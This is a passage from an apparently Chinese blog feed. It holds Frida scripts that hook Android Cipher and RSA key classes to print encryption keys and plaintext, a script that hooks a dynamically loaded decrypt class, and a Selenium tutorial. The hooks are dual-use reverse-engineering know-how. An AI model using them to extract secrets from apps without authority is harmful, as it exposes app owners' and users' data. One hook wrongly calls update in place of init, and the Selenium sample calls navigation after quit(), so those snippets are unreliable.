class="function"><span class="keyword">function</span> (<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.init(a, b, c);</span><br><span class="line">        <span class="keyword">if</span> (N_ENCRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 加密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(N_DECRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 解密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bytes_key = b.getEncoded();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|str密钥:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes_key));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key: |base64  :&quot;</span>  + Base64.encodeToString(bytes_key,<span class="number">0</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|Hex密钥:&quot;</span> + ByteString.of(bytes_key).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.init.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.Key&#x27;</span>, <span class="string">&#x27;java.security.AlgorithmParameters&#x27;</span>, <span class="string">&#x27;java.security.SecureRandom&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c, d</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.init(a, b, c, d);</span><br><span class="line">        <span class="keyword">if</span> (N_ENCRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 加密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(N_DECRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 解密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bytes_key = b.getEncoded();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|str密钥:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes_key));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key: |base64  :&quot;</span>  + Base64.encodeToString(bytes_key,<span class="number">0</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|Hex密钥:&quot;</span> + ByteString.of(bytes_key).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.init.overload(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;java.security.Key&#x27;</span>, <span class="string">&#x27;java.security.spec.AlgorithmParameterSpec&#x27;</span>, <span class="string">&#x27;java.security.SecureRandom&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c, d</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.update(a, b, c, d);</span><br><span class="line">        <span class="keyword">if</span> (N_ENCRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 加密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(N_DECRYPT_MODE == a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;init  | 解密模式&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bytes_key = b.getEncoded();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|str密钥:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(bytes_key));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key: |base64  :&quot;</span>  + Base64.encodeToString(bytes_key,<span class="number">0</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;init key:&quot;</span> + <span class="string">&quot;|Hex密钥:&quot;</span> + ByteString.of(bytes_key).hex());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cipher.update.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.update(a);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;update:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.update.overload(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.update(a, b, c);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;update:&quot;</span> + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a) + <span class="string">&quot;|&quot;</span> + b + <span class="string">&quot;|&quot;</span> + c);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.doFinal.overload().implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.doFinal();</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |str  :&quot;</span>     + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(result));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |hex  :&quot;</span>     + ByteString.of(result).hex());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |base64  :&quot;</span>  + Base64.encodeToString(result,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.doFinal.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.doFinal(a);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal参数: |str  :&quot;</span>     + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(a));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal参数: |base64  :&quot;</span>  + Base64.encodeToString(a,<span class="number">0</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |str  :&quot;</span>     + Java.use(<span class="string">&#x27;java.lang.String&#x27;</span>).$new(result));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |hex  :&quot;</span>     + ByteString.of(result).hex());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;doFinal结果: |base64  :&quot;</span>  + Base64.encodeToString(result,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> x509EncodedKeySpec = Java.use(<span class="string">&#x27;java.security.spec.X509EncodedKeySpec&#x27;</span>);</span><br><span class="line">    x509EncodedKeySpec.$init.overload(<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.$init(a);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;RSA密钥:&quot;</span> + Base64.encodeToString(a,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> rSAPublicKeySpec = Java.use(<span class="string">&#x27;java.security.spec.RSAPublicKeySpec&#x27;</span>);</span><br><span class="line">    rSAPublicKeySpec.$init.overload(<span class="string">&#x27;java.math.BigInteger&#x27;</span>, <span class="string">&#x27;java.math.BigInteger&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        printstack();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="built_in">this</span>.$init(a, b);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;RSA密钥N:&quot;</span> + a.toString(<span class="number">16</span>));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;RSA密钥E:&quot;</span> + b.toString(<span class="number">16</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>参考:<a href="https://blog.csdn.net/weixin_44032232/article/details/109643407">https://blog.csdn.net/weixin_44032232/article/details/109643407</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frida hook 动态加载dex 解决hook不到类</title>
      <link href="/posts/62230/"/>
      <url>/posts/62230/</url>
      
        <content type="html"><![CDATA[<p><strong>问题:</strong></p><p>jadx中有代码,但hook不到类,打印无返回</p><p>这种情况可能是动态加载dex,类可能在另外的classloader中,需要切换到对应的classloader中在hook</p><p>frida 有一个接口 <strong>enumerateClassloaders()</strong> //枚举遍历所有的classloader类加载器</p><p><strong>hook代码:</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> MAppliction = Java.use(<span class="string">&#x27;类名&#x27;</span>) <span class="comment">//</span></span><br><span class="line">    <span class="built_in">console</span>.log(MAppliction.getInstance().getResources().getString(<span class="number">2131820921</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;ddddddddddddddddd&#x27;</span>)</span><br><span class="line">        Java.enumerateClassLoaders(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span>(<span class="params">loader</span>)</span>&#123;</span><br><span class="line">                Java.classFactory.loader = loader;</span><br><span class="line">                <span class="keyword">var</span> TestClass;</span><br><span class="line">                <span class="keyword">try</span>&#123; <span class="comment">//处理报错,如果hook不到这个类,继续遍历下一个classloaders</span></span><br><span class="line">                    TestClass = Java.use(<span class="string">&quot;com.xbiao.utils.AESedeUtil&quot;</span>);</span><br><span class="line">                    TestClass.decrypt.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">p1,p2</span>)</span>&#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(<span class="string">&#x27;decrypt p1:&#x27;</span>+p1)</span><br><span class="line">                        <span class="built_in">console</span>.log(<span class="string">&#x27;decrypt p2:&#x27;</span>+p2)</span><br><span class="line">                        <span class="keyword">return</span> <span class="built_in">this</span>.decrypt(p1,p2)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span>(error)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(error.message.includes(<span class="string">&quot;ClassNotFoundException&quot;</span>))&#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(<span class="string">&quot; You are trying to load encrypted class, trying next loader&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(error.message);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python selenium4 库使用</title>
      <link href="/posts/41283/"/>
      <url>/posts/41283/</url>
      
        <content type="html"><![CDATA[<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置:"></a>环境配置:</h3><p><strong>chromedriver</strong></p><p>Windows下需要放到Chrome安装目录,且下载版本和chrome浏览器一致.</p><p> <a href="https://chromedriver.storage.googleapis.com/index.html">https://chromedriver.storage.googleapis.com/index.html</a></p><p><strong>Firefox</strong></p><p><a href="https://github.com/mozilla/geckodriver/releases/">https://github.com/mozilla/geckodriver/releases/</a></p><p><strong>IE</strong></p><p><a href="http://selenium-release.storage.googleapis.com/index.html">http://selenium-release.storage.googleapis.com/index.html</a></p><p><strong>安装 selenium</strong><br><code>pip3 install selenium</code></p><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><p><strong>导入库</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver<span class="comment">#导入相关库</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br></pre></td></tr></table></figure><p><strong>启动一个浏览器</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">driver = webdriver.Chrome(<span class="string">&quot;C:\Program Files\Google\Chrome\Application\chromedriver.exe&quot;</span>)<span class="comment">#指定chromedriver,不然会报错</span></span><br><span class="line">driver.get(<span class="string">&#x27;https://www.baidu.com/&#x27;</span>)<span class="comment">#打开一个网站</span></span><br></pre></td></tr></table></figure><h3 id="元素定位"><a href="#元素定位" class="headerlink" title="元素定位"></a>元素定位</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;kw&quot;</span> <span class="attr">name</span>=<span class="string">&quot;wd&quot;</span> <span class="attr">class</span>=<span class="string">&quot;s_ipt&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;255&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;su&quot;</span> <span class="attr">value</span>=<span class="string">&quot;百度一下&quot;</span> <span class="attr">class</span>=<span class="string">&quot;bg s_btn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">class</span>=<span class="string">&quot;lnk-movie&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://movie.douban.com&quot;</span>&gt;</span>豆瓣电影<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>选择器</th><th>语法</th></tr></thead><tbody><tr><td>id</td><td>driver.find_element(By.ID,’id’)</td></tr><tr><td>name</td><td>driver.find_element(By.NAME,’name’)</td></tr><tr><td>class name</td><td>driver.find_element(By.CLASS_NAME,’name’)</td></tr><tr><td>tag name</td><td>driver.find_element(By.TAG_NAME,’name’)</td></tr><tr><td>link text</td><td>driver.find_element(By.LINK_TEXT,’name’)</td></tr><tr><td>partial link text</td><td>driver.find_element(By.PARTIAL_LINK_TEXT,’name’)</td></tr><tr><td>css selector</td><td>driver.find_element(By.CSS_SELECTOR,’name’)</td></tr><tr><td>xpath</td><td>driver.find_element(By.XPATH,’name’)</td></tr></tbody></table><p><strong>ID</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;s_ipt&quot;</span> <span class="attr">name</span>=<span class="string">&quot;wd&quot;</span> <span class="attr">id</span>=<span class="string">&quot;kw&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;100&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">element = driver.find_element(By.ID, <span class="string">&#x27;kw&#x27;</span>)   <span class="comment"># 通过ID定位搜索框</span></span><br><span class="line">element.send_keys(<span class="string">&#x27;selenium&#x27;</span>)    <span class="comment"># 输入selenium 验证定位是否成功</span></span><br></pre></td></tr></table></figure><p><strong>name</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;s_ipt&quot;</span> <span class="attr">name</span>=<span class="string">&quot;wd&quot;</span> <span class="attr">id</span>=<span class="string">&quot;kw&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;100&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element = driver.find_element(By.NAME, <span class="string">&#x27;wd&#x27;</span>)   <span class="comment"># 通过name定位搜索框</span></span><br></pre></td></tr></table></figure><p><strong>class</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;s_ipt&quot;</span> <span class="attr">name</span>=<span class="string">&quot;wd&quot;</span> <span class="attr">id</span>=<span class="string">&quot;kw&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;100&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn_wr s_btn_wr bg&quot;</span> <span class="attr">name</span>=<span class="string">&quot;wd&quot;</span> <span class="attr">id</span>=<span class="string">&quot;kw&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;100&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element = driver.find_element(By.CLASS_NAME, <span class="string">&#x27;s_ipt&#x27;</span>)   <span class="comment"># 获取百度首页搜索框</span></span><br><span class="line"></span><br><span class="line">element = driver.find_element(By.CLASS_NAME, <span class="string">&#x27;btn_wr s_btn_wr bg&#x27;</span>) <span class="comment">#定位不到,只能选择其中一个</span></span><br></pre></td></tr></table></figure><p><strong>tag name</strong></p><p>tag name，即元素标签名称，如input、p、a、button、span等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element = driver.find_element(By.TAG_NAME, <span class="string">&#x27;input&#x27;</span>)  <span class="comment"># 查找标签名称是input的元素</span></span><br></pre></td></tr></table></figure><p><strong>link text</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;www.xxx.com“&gt;xxx //超文本连接定位</span></span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element = driver.find_element(By.LINK_TEXT, <span class="string">&#x27;贴吧&#x27;</span>)   <span class="comment"># 定位贴吧</span></span><br></pre></td></tr></table></figure><p><strong>partial link text</strong></p><p>此定位方式于link text一样，都只能作用于链接元素，也使用可见文本进行匹配，不同之处在于，link text表示可见文本必须于指定的文本完全一致，才能匹配成功，而partial link text只要可见文本中包含指定的文本，则匹配成功，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element = driver.find_element(By.PARTIAL_LINK_TEXT, <span class="string">&#x27;贴&#x27;</span>)   <span class="comment"># 定位贴吧</span></span><br></pre></td></tr></table></figure><p><strong>css selector</strong>  </p><p>语法较为复杂,舍弃</p><p><strong>xpath</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">element = driver.find_element(By.XPATH, <span class="string">&quot;//*/input[@id=&#x27;kw&#x27;]&quot;</span>)</span><br><span class="line">element = driver.find_element(By.XPATH, <span class="string">&quot;//*/input[@name=&#x27;wd&#x27;]&quot;</span>)</span><br><span class="line">element = driver.find_element(By.XPATH, <span class="string">&quot;//*/input[@class=&#x27;s_ipt&#x27;]&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>定位iframe</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span> <span class="attr">id</span>=<span class="string">&quot;iframeResult&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height: 219.64px;&quot;</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element.switch_to.frame(<span class="string">&#x27;iframeResult&#x27;</span>)  <span class="comment">#选择iframe</span></span><br></pre></td></tr></table></figure><h3 id="交互操作"><a href="#交互操作" class="headerlink" title="交互操作"></a>交互操作</h3><p><strong>操作对象</strong></p><ul><li>click——点击对象</li><li>send_keys——在对象上模拟按键输入</li><li>clear——清除对象的内容，如果可以的话</li><li>submit——提交对象的内容，表单提交</li><li>text——用于获取元素的文本信息</li></ul><p><strong>键盘事件</strong></p><p>要想调用键盘按键操作需要引入 keys 包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys  通过 send_keys()调用按键：</span><br><span class="line">send_keys(Keys.TAB) <span class="comment"># TAB</span></span><br><span class="line">send_keys(Keys.ENTER) <span class="comment"># 回车</span></span><br><span class="line">driver.find_element(By.<span class="built_in">id</span>,<span class="string">&quot;kw&quot;</span>).send_keys(Keys.CONTROL,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#ctrl+A 全选</span></span><br><span class="line">driver.find_element(By.<span class="built_in">id</span>,<span class="string">&quot;kw&quot;</span>).send_keys(Keys.CONTROL,<span class="string">&#x27;x&#x27;</span>) <span class="comment">#ctrl+X 剪切</span></span><br></pre></td></tr></table></figure><p><strong>鼠标事件</strong></p><p>需要引入ActionChains类,鼠标事件一般包括鼠标右键、双击、拖动、移动鼠标到某个元素上等等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line">perform()  <span class="comment">#执行所有ActionChains 中存储的行为；</span></span><br><span class="line">context_click()  <span class="comment">#右击；</span></span><br><span class="line">double_click()   <span class="comment">#双击；</span></span><br><span class="line">drag_and_drop()  <span class="comment">#拖动；</span></span><br><span class="line">move_to_element()   <span class="comment">#鼠标悬停。</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver<span class="comment">#导入相关库</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(<span class="string">&quot;C:\Program Files\Google\Chrome\Application\chromedriver.exe&quot;</span>)<span class="comment">#指定chromedriver,不然会报错</span></span><br><span class="line">driver.get(<span class="string">&#x27;https://www.baidu.com/&#x27;</span>)<span class="comment">#打开一个网站</span></span><br><span class="line">driver.find_element(By.ID, <span class="string">&#x27;kw&#x27;</span>).send_keys(<span class="string">&#x27;联想&#x27;</span>)  <span class="comment">#搜索框输入selenium</span></span><br><span class="line">driver.find_element(By.ID, <span class="string">&#x27;su&#x27;</span>).click()     <span class="comment"># 点击百度一下</span></span><br><span class="line">time.sleep(<span class="number">30</span>)</span><br><span class="line">driver.back()  <span class="comment">#返回</span></span><br><span class="line">driver.quit() <span class="comment">#退出浏览器</span></span><br><span class="line">driver.close()<span class="comment">#关闭标签</span></span><br><span class="line">driver.forward()  <span class="comment">#后退</span></span><br><span class="line">driver.refresh()  <span class="comment">#刷新</span></span><br></pre></td></tr></table></figure><p><strong>获取页面属性</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">r&#x27;https://www.baidu.com&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(browser.title)<span class="comment"># 网页标题</span></span><br><span class="line"><span class="built_in">print</span>(browser.current_url)<span class="comment"># 当前网址</span></span><br><span class="line"><span class="built_in">print</span>(browser.name)<span class="comment"># 浏览器名称</span></span><br><span class="line"><span class="built_in">print</span>(browser.page_source)<span class="comment"># 